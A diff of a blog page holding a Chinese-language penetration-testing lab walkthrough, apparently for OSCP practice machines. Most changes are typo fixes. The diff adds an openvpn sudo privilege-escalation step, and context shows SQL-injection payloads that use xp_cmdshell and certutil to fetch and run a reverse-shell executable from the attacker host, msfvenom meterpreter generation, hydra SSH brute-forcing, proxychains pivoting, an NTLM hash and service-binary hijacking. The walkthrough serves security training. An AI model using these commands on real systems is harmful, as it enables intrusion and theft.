@@ -72,9 +72,9 @@ Ports
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Red6380" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 5.4.2">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Red6380" type="application/atom+xml">
 </head>
 
 
@@ -366,7 +366,7 @@ Ports
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.6k
                 </div>
                 
 
@@ -422,12 +422,12 @@ table th:nth-of-type(2) {
 </tr>
 <tr>
 <td>192.168.x.122</td>
-<td>22,、1194</td>
+<td>22、1194</td>
 </tr>
 </tbody></table>
 </div></div>
 
-<h1 id="192-168-x-121"><a href="#192-168-x-121" class="headerlink" title="192.168.x.121"></a>192.168.x.121</h1><p>分别对有web服务的120、121机器进行目录扫描，120机器未发现攻击点，但在121中有登录点，进行测试在用户名处发现sql注入并且是MSsql，可直接使用xp_cmdshell进行命令执行。</p>
+<h1 id="192-168-x-121"><a href="#192-168-x-121" class="headerlink" title="192.168.x.121"></a>192.168.x.121</h1><p>分别对有web服务的120、121机器进行目录扫描，120机器未发现攻击点，但在121机器的web服务中有登录点，进行测试在用户名处发现sql注入并且是MSsql，可直接使用xp_cmdshell进行命令执行。</p>
 <p>使用msfvenom生成exe，并使用msfconsole监听模块链接反弹的shell。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">生成exe木马命令
 msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.45.223 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> shlle.exe
@@ -442,8 +442,6 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>在生成的shell.exe目录下使用python开启一个简单的web服务</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-
-
 <p>在sql注入中上传生成的shell.exe并执行此程序。</p>
 <pre class="line-numbers language-none"><code class="language-none">SQL注入payload1:
 ';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.223:9999/shell.exe c:/temp/shell.exe';--
@@ -451,7 +449,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 SQL注入payload1:
 ';exec xp_cmdshell 'c:/temp/shell.exe';--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>成功接收到shell，但是并非管理员权限，接着继续上传winPEAS64.exe查看是否有相关提权漏洞。</p>
+<p>成功接收到shell，但是并非管理员权限，接着继续上传winPEAS64.exe工具查看是否有相关提权漏洞。</p>
 <p>在检测出来的结果中，发现了此用户具有SeImpersonaterPrivilege权限，有此权限后可使用<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">烂土豆</a>进行提权。</p>
 <img src="/oscp1/1.png" class="">
 
@@ -487,15 +485,21 @@ remote_port = 6000<span aria-hidden="true" class="line-numbers-rows"><span></spa
 <pre class="line-numbers language-none"><code class="language-none">[common]
 bind_port = 7000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>在kali中使用编辑/etc/proxychains4.conf中的配置，即在末尾加上<code>socks5 192.168.45.223 6000</code>即可使用proxychains进行内网访问，如内网端口扫描<code>proxychains nmap 172.16.234.10-14 -sS -p 1-10000</code>。</p>
+<p>在kali中编辑/etc/proxychains4.conf中的配置，即在末尾加上<code>socks5 192.168.45.223 6000</code>即可使用proxychains进行内网访问，如内网端口扫描<code>proxychains nmap 172.16.234.10-14 -sS -p 1-10000</code>。</p>
 <img src="/oscp1/7.png" class="">
 
 
 
-<h1 id="192-168-x-122"><a href="#192-168-x-122" class="headerlink" title="192.168.x.122"></a>192.168.x.122</h1><p>机器120、122均开放了22端口，因为是web服务不会处于域中故使用非域用户offsec对这两台机器进行爆破尝试。</p>
+<h1 id="192-168-x-122"><a href="#192-168-x-122" class="headerlink" title="192.168.x.122"></a>192.168.x.122</h1><p>机器120、122均开放了22端口，使用非域用户offsec对这两台机器进行爆破尝试。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> offsec <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt <span class="token parameter variable">-M</span> ip.txt <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>122机器爆破成功，账号密码为offsec/password，直接ssh登录，在当前目录下发现flag文件local.txt</p>
+<p>使用命令<code>sudo -l </code>查看，发现<code>openvpn</code>命令可以提权</p>
+<img src="/oscp1/25.png" class="">
+
+<p>通过查看历史命令发现了<code>sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'</code>命令，随即执行该命令即可获得root权限。在<code>/root</code>目录下即可找到flag文件proof.txt。</p>
+<img src="/oscp1/26.png" class="">
+
 <h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><div style="text-align: center;">
   <div style="display: inline-block; text-align: left;">
 
@@ -562,7 +566,7 @@ goomba NTLM:8e9e1516818ce4e54247e71e71b5f436<span aria-hidden="true" class="line
 <p>并且在desktop目录下发现flag文件local.txt。此用户不在本地管理员组，故还需寻找提权点。</p>
 <img src="/oscp1/12.png" class="">
 
-<p>上传winPEASx64.exe执行，可发现如何用户对auditTracker.exe都有操作权限，故直接上传木马覆盖此文件。</p>
+<p>上传winPEASx64.exe执行，可发现任何用户对auditTracker.exe都有操作权限，故直接上传木马覆盖此文件。</p>
 <img src="/oscp1/13.png" class="">
 
 <p>使用msfvenom生成木文件后上传覆盖，并执行命令<code>sc.exe start auditTracker</code></p>
@@ -636,59 +640,6 @@ certutil <span class="token parameter variable">-urlcache</span> <span class="to
 
 <p>寻找提权点，输入sudo -l后发现，可以直接su roo后输入offsec密码进行提权</p>
 <img src="/oscp1/24.png" class="">
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
 
                 
             </div>
